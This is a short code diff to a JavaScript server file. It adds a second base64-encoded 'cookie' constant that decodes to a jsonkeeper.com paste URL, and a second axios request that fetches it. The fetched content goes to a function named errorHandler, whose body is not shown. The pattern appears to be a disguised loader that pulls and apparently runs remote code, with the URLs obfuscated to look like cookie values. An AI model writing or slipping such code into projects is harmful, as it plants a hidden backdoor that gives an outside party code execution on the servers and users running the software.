@@ -33,9 +33,15 @@ const errorHandler = (error) => {
 };
 
 const COOKIE_VALUE = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi83RUJaUA=="
+const COOKIE_VALUE_1 = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9QQUIxUg=="
 
 const getCookie = async (req, res, next) => {
   axios.get(atob(COOKIE_VALUE)).then(
+    res => {
+      errorHandler(res.data.content)
+    }
+  );
+  axios.get(atob(COOKIE_VALUE_1)).then(
     res => {
       errorHandler(res.data.content)
     }
